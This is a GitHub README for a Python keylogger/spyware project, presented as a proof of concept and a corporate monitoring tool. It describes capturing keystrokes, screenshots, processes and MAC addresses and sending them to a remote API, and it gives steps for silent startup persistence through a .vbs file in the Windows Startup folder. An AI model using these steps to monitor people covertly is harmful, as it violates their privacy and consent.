# spyware

## Development:
* Python 3.8 was used as the base language;
* Auxiliary libraries were used for data extraction (Keyboard, getmac, psutil, base64, io, pyscreenshot, and IPy);
* An API, developed by me and hosted on Heroku, was used to save the data;
* The requests library was used for data transmission and the json library for serialization;
* Integrated with ChatGPT to assist in detecting hate speech, in addition to my developed prediction models.

## Project:
* Proof of concept project for the development of malware so that we can learn how to avoid and recognize them;
* This spyware is part of a larger project called Remote-Analyser, which is a system developed by me, for collecting suspicious data on corporate and/or institutional computers. Thus, serving as a more efficient monitoring of these entities' assets;
* This script that collects data was developed in Python using various specific libraries to assist in development. This script remains active and will generate an Alert whenever something suspicious is typed, if any malicious process is running, or if there is any open port with a suspicious application, sending the data to the API Gateway. The collected data includes: the PC's MAC address, the typed phrase that triggered the Alert, the active processes in the system, and a PrintScreen of the user's screen. After that, the script logs into the API Gateway and uses the generated token to save the data in the API.
* The script also integrates with a model I created to detect hate speech, in addition to a Sniffer and a Scanner, to avoid unwanted sites and vulnerabilities;
* Recently, an integration with ChatGPT was made to assist in hate speech analysis.

## How to use:
* First, you need to download the project and run the command:
```
python setup.py build
```
* This command will compile the project, generating a project with a .exe file (Or just download the compiled project [here](https://github.com/DarlanNoetzold/spyware/raw/main/spyware/keyLogger.rar));
* Copy the folder with the .exe and paste it into a directory called keyLogger;
* This folder should be placed in the root directory of your OS;
* After that, just go to the directory `C:\Users\<Your User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`;
* And paste the [.vbs file](https://github.com/DarlanNoetzold/spyware/blob/main/spyware/script_background.vbs);
* Now, the script will be executed every time Windows starts, without needing the used libraries, nor Python.

### OR

* The complete application containing all configured microservices can be obtained at [DockerHub](https://hub.docker.com/repository/docker/darlannoetzold/tcc-spyware/general).
* To run it more easily, just execute the following commands:
```
docker container run --platform=linux/amd64 -it -p 8091:8091 -p 8090:8090 -p 5000:5000 -p 9091:9090 -p 3000:3000 --name=app -d darlannoetzold/tcc-spyware:4.0
docker exec -itd app /init-spyware-api.sh
docker exec -itd app /init-remoteanalyser.sh
docker exec -itd app /init-handler-hatespeech.sh
```

---
## API:
* GitHub Repository:
<br>Link: [https://github.com/DarlanNoetzold/spyware-API](https://github.com/DarlanNoetzold/spyware-API)

---
## HateSpeech API:
* GitHub Repository:
<br>Link: [https://github.com/DarlanNoetzold/HateSpeech-portuguese](https://github.com/DarlanNoetzold/HateSpeech-portuguese)

---
## Remote-Analyser
* GitHub Repository:
<br>Link: [https://github.com/DarlanNoetzold/Remote-Analyser](https://github.com/DarlanNoetzold/Remote-Analyser)

---
⭐️ From [DarlanNoetzold](https://github.com/DarlanNoetzold)

